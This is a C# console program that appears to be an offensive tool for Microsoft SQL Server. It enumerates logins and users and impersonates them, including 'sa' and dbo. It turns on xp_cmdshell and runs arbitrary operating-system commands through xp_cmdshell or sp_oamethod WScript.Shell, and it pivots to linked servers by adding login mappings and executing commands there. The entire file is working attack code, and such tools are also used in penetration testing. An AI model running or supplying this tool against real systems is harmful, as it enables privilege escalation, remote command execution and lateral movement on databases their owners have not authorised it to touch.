using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            // Ask the user for SQL Server name, Database name, Username, and Password
            Console.Write("Enter SQL Server name: ");
            string sqlServer = Console.ReadLine();

            Console.Write("Enter Database name: ");
            string database = Console.ReadLine();

            Console.Write("Enter Username: ");
            string username = Console.ReadLine();

            Console.Write("Enter Password: ");
            string password = Console.ReadLine();

            // Construct the connection string dynamically
            string conString = $"Server={sqlServer}; Database={database}; User Id={username}; Password={password}; MultipleActiveResultSets=true;";

            // Create a new SqlConnection object with the constructed connection string
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open(); // Open the connection
                Console.WriteLine("\n[+] Connection established successfully." + "\n");

                while (true)
                {
                    // List logins and users
                    List<string> impersonableLogins = ListImpersonableLogins(con);
                    List<string> impersonableUsers = ListImpersonableUsers(con);

                    // Display available options
                    Console.WriteLine("Choose an option:" + "\n");
                    Console.WriteLine("\t" + "1. Impersonate a login (EXECUTE AS LOGIN)");
                    Console.WriteLine("\t" + "2. Impersonate a user (EXECUTE AS USER)");
                    Console.WriteLine("\t" + "3. Execute command on a linked server (EXEC AT LinkedServer)" + "\n");
                    Console.Write("Enter 1, 2, or 3: ");
                    string choice = Console.ReadLine();

                    if (choice.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("Exiting...");
                        break;
                    }

                    if (choice == "1")
                    {
                        // Display list of logins to impersonate
                        Console.WriteLine("\nSelect a login to impersonate:" + "\n");
                        for (int i = 0; i < impersonableLogins.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {impersonableLogins[i]}\n");
                        }
                        Console.Write("Enter the number of the login to impersonate: ");
                        int loginChoice = int.Parse(Console.ReadLine()) - 1;

                        if (loginChoice >= 0 && loginChoice < impersonableLogins.Count)
                        {
                            string selectedLogin = impersonableLogins[loginChoice];
                            ImpersonateLoginAndExecuteCommand(con, selectedLogin);
                        }
                        else
                        {
                            Console.WriteLine("Invalid choice.");
                        }
                    }
                    else if (choice == "2")
                    {
                        // Display list of users to impersonate
                        Console.WriteLine("Select a user to impersonate:" + "\n");
                        for (int i = 0; i < impersonableUsers.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {impersonableUsers[i]}");
                        }
                        Console.Write("\nEnter the number of the user to impersonate: ");
                        int userChoice = int.Parse(Console.ReadLine()) - 1;

                        if (userChoice >= 0 && userChoice < impersonableUsers.Count)
                        {
                            ImpersonateAndExecute(con, impersonableUsers[userChoice]);
                        }
                        else
                        {
                            Console.WriteLine("Invalid choice.");
                        }
                    }
                    else if (choice == "3")
                    {
                        List<string> linkedServers = ListLinkedServers(con);

                        if (linkedServers.Count == 0)
                        {
                            Console.WriteLine("No linked servers found.");
                            continue;
                        }

                        Console.WriteLine("Available linked servers:");
                        for (int i = 0; i < linkedServers.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {linkedServers[i]}");
                        }

                        Console.Write("Enter the number of the linked server to execute commands on: ");
                        if (int.TryParse(Console.ReadLine(), out int linkedServerChoice) && linkedServerChoice > 0 && linkedServerChoice <= linkedServers.Count)
                        {
                            string selectedLinkedServer = linkedServers[linkedServerChoice - 1];
                            ExecuteCommandsOnLinkedServer(con, selectedLinkedServer);
                        }
                        else
                        {
                            Console.WriteLine("Invalid choice. Please select a valid number.");
                        }
                    }
                    else
                    {
                        Console.WriteLine("Invalid choice. Please enter 1, 2, or 3.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred while opening the connection: " + ex.Message);
            }
            finally
            {
                if (con.State == System.Data.ConnectionState.Open)
                {
                    con.Close();
                    Console.WriteLine("Connection closed.");
                }
            }
        }

        static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
        {
            try
            {
                string impersonateCmd = $"EXECUTE AS LOGIN = '{impersonatedLogin}';";
                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                impersonateCommand.ExecuteNonQuery();
                Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");

                // Ask the user to choose between xp_cmdshell or sp_oamethod
                Console.WriteLine("Choose how to execute the command:" + "\n");
                Console.WriteLine("\t" + "1. Use xp_cmdshell");
                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                Console.Write("Enter 1 or 2: ");
                string execChoice = Console.ReadLine();

                // Get the command to execute from the user
                Console.Write("Enter the full command to execute: ");
                string usercommand = Console.ReadLine();

                if (execChoice == "1")
                {
                    // Execute using xp_cmdshell
                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
                    ExecuteCommandWithXpCmdShell(con, usercommand);
                }
                else if (execChoice == "2")
                {
                    // Execute using sp_oamethod
                    ExecuteCommandWithSpOaMethod(con, usercommand);
                }
                else
                {
                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
                }

                // Revert the impersonation
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error impersonating login and executing command: " + ex.Message);
            }
        }


        static List<string> ListLinkedServers(SqlConnection con)
        {
            List<string> linkedServers = new List<string>();
            string query = "SELECT name FROM sys.servers WHERE is_linked = 1;";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    linkedServers.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error listing linked servers: " + ex.Message);
            }

            return linkedServers;
        }

        static void ExecuteCommandsOnLinkedServer(SqlConnection con, string linkedServer)
        {
            try
            {
                // Ensure login mapping exists for the linked server
                CreateLoginMapping(con, linkedServer);

                Console.WriteLine($"\nExecuting commands on linked server: {linkedServer}\n");

                Console.WriteLine("Choose an action:\n");
                Console.WriteLine("\t1. Enable xp_cmdshell");
                Console.WriteLine("\t2. Execute a command using xp_cmdshell\n");
                Console.Write("Enter 1 or 2: ");
                string actionChoice = Console.ReadLine();

                if (actionChoice == "1")
                {
                    EnableXpCmdShellOnLinkedServer(con, linkedServer);
                }
                else if (actionChoice == "2")
                {
                    Console.Write("Enter the full command to execute: ");
                    string userCommand = Console.ReadLine();

                    if (string.IsNullOrWhiteSpace(userCommand))
                    {
                        Console.WriteLine("Command cannot be empty.");
                        return;
                    }

                    ExecuteCommandOnLinkedServer(con, linkedServer, userCommand);
                }
                else
                {
                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing commands on linked server: " + ex.Message);
            }
        }

        static void CreateLoginMapping(SqlConnection con, string linkedServer)
        {
            try
            {
                // Create login mapping for the linked server
                string createMappingCmd = $"EXEC sp_addlinkedsrvlogin @rmtsrvname = '{linkedServer}', @useself = 'false', @locallogin = NULL, @rmtuser = 'remote_user', @rmtpassword = 'remote_password';";
                SqlCommand command = new SqlCommand(createMappingCmd, con);
                command.ExecuteNonQuery();
                Console.WriteLine($"Login mapping created for linked server {linkedServer}.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error creating login mapping for linked server: " + ex.Message);
            }
        }

        static void EnableXpCmdShellOnLinkedServer(SqlConnection con, string linkedServer)
        {
            try
            {
                string enableCmd = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedServer}];";
                SqlCommand command = new SqlCommand(enableCmd, con);
                command.ExecuteNonQuery();
                Console.WriteLine("Enabled xp_cmdshell on the linked server.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error enabling xp_cmdshell on linked server: " + ex.Message);
            }
        }

        static void ExecuteCommandOnLinkedServer(SqlConnection con, string linkedServer, string userCommand)
        {
            try
            {
                string execCmd = $"EXEC ('xp_cmdshell ''{userCommand.Replace("'", "''")}''') AT [{linkedServer}];";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                bool hasOutput = false;
                while (reader.Read())
                {
                    string result = reader.IsDBNull(0) ? null : reader.GetString(0);
                    if (result != null)
                    {
                        Console.WriteLine(result);
                        hasOutput = true;
                    }
                }

                if (!hasOutput)
                {
                    Console.WriteLine("No output returned from xp_cmdshell.");
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing command on linked server: " + ex.Message);
            }
        }

        static List<string> ListImpersonableLogins(SqlConnection con)
        {
            List<string> logins = new List<string>();
            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    logins.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error listing logins: " + ex.Message);
            }

            return logins;
        }

        static void ImpersonateAndExecute(SqlConnection con, string impersonatedUser)
        {
            try
            {
                // If the user is 'dbo', switch to msdb first
                if (impersonatedUser.Equals("dbo", StringComparison.OrdinalIgnoreCase))
                {
                    string switchToMsdbCmd = "USE msdb; EXECUTE AS USER = 'dbo';";
                    SqlCommand switchToMsdbCommand = new SqlCommand(switchToMsdbCmd, con);
                    switchToMsdbCommand.ExecuteNonQuery();
                    Console.WriteLine("\nSwitched to msdb and impersonating dbo user...\n");
                }
                else
                {
                    string impersonateCmd = $"EXECUTE AS USER = '{impersonatedUser}';";
                    SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                    impersonateCommand.ExecuteNonQuery();
                    Console.WriteLine($"\nImpersonating user: {impersonatedUser}...\n");
                }

                // Ask the user to choose between xp_cmdshell or sp_oamethod
                Console.WriteLine("Choose how to execute the command:" + "\n");
                Console.WriteLine("\t" + "1. Use xp_cmdshell");
                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                Console.Write("Enter 1 or 2: ");
                string execChoice = Console.ReadLine();

                // Get the command to execute from the user
                Console.Write("Enter the full command to execute: ");
                string usercommand = Console.ReadLine();

                if (execChoice == "1")
                {
                    // Execute using xp_cmdshell
                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
                    ExecuteCommandWithXpCmdShell(con, usercommand);
                }
                else if (execChoice == "2")
                {
                    // Execute using sp_oamethod
                    ExecuteCommandWithSpOaMethod(con, usercommand);
                }
                else
                {
                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
                }

                // Revert the impersonation
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error impersonating user and executing command: " + ex.Message);
            }
        }

        static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
        {
            try
            {
                // Execute the command using sp_oamethod (WScript Shell)
                string execCmd = $"EXEC sp_oamethod 'WScript.Shell', 'Run', null, '{usercommand}', 0, true;";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                bool hasOutput = false;
                while (reader.Read())
                {
                    string result = reader.IsDBNull(0) ? null : reader.GetString(0);
                    if (result != null)
                    {
                        Console.WriteLine(result);
                        hasOutput = true;
                    }
                }

                if (!hasOutput)
                {
                    Console.WriteLine("No output returned from sp_oamethod.");
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing command with sp_oamethod: " + ex.Message);
            }
        }

        static void ExecuteCommandWithXpCmdShell(SqlConnection con, string usercommand)
        {
            try
            {
                // Execute the full command provided by the user using xp_cmdshell
                string execCmd = $"EXEC xp_cmdshell '{usercommand}';";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                bool hasOutput = false;

                while (reader.Read())
                {
                    string result = reader.IsDBNull(0) ? null : reader.GetString(0); // Check for null values in the result

                    if (result != null)
                    {
                        Console.WriteLine(result); // Output the command result if it's not null
                        hasOutput = true;
                    }
                }

                if (!hasOutput)
                {
                    Console.WriteLine("No output returned from xp_cmdshell.");
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing command with xp_cmdshell: " + ex.Message);
            }
        }


        static void EnableXpCmdShell(SqlConnection con)
        {
            try
            {
                // Enable xp_cmdshell if not already enabled
                string enableCmd = "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                SqlCommand enableCommand = new SqlCommand(enableCmd, con);
                enableCommand.ExecuteNonQuery();
                Console.WriteLine("Enabled xp_cmdshell.\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error enabling xp_cmdshell: " + ex.Message);
            }
        }


        static List<string> ListImpersonableUsers(SqlConnection con)
        {
            List<string> users = new List<string>();
            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G');";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    users.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error listing users: " + ex.Message);
            }

            return users;
        }
    }
}
